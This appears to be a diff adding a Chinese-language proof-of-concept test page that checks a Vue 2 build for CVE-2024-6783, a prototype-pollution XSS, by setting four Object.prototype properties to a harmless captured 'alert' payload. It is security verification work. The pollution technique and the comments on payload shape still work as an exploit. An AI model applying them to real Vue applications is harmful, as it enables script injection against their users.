@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="zh">
+  <head>
+    <meta charset="UTF-8" />
+    <title>CVE PoC — Vue 2 安全验证</title>
+    <script>
+      // 在 Vue 加载之前完成两件事：
+      // 1) 把 alert 改成"置位标记"的实现，避免 4 个测试节点连续弹 4 次模态框；
+      //    保留 alert 全局名以便 PAYLOAD 渲染期执行时被捕获。
+      // 2) 按 Snyk SNYK-JS-VUETEMPLATECOMPILER-7444918 官方 PoC 污染 4 个原型属性。
+      //    注意 PAYLOAD 必须是单一表达式：
+      //    codegen 会把它直接拼进对象字面量 `{staticClass:<PAYLOAD>}`，
+      //    若 PAYLOAD 含 `;` / 赋值语句会让 new Function() 抛 SyntaxError，
+      //    Vue 把 render 回退成 noop，反而看不到漏洞执行。
+      window.__alertCalled = false
+      window.__alertMsg = null
+      window.alert = function (msg) {
+        window.__alertCalled = true
+        window.__alertMsg = msg
+      }
+      const PAYLOAD = 'alert("Polluted")'
+      Object.prototype.staticClass = PAYLOAD
+      Object.prototype.classBinding = PAYLOAD
+      Object.prototype.staticStyle = PAYLOAD
+      Object.prototype.styleBinding = PAYLOAD
+    </script>
+  </head>
+  <body>
+    <h1>CVE PoC</h1>
+    <p>
+      参考
+      <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-6783"
+        >NVD CVE-2024-6783</a
+      >
+      (vue-template-compiler 原型污染 XSS) +
+      <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-9506"
+        >NVD CVE-2024-9506</a
+      >
+      (Vue parseHTML ReDoS)
+    </p>
+    <div id="result"></div>
+    <!-- CVE-2024-6783 实际挂载节点（修复版渲染为空 div，仅用于触发 render 执行） -->
+    <div id="xss-staticClass" hidden></div>
+    <div id="xss-classBinding" hidden></div>
+    <div id="xss-staticStyle" hidden></div>
+    <div id="xss-styleBinding" hidden></div>
+    <script src="./poc.bundle.js"></script>
+  </body>
+</html>
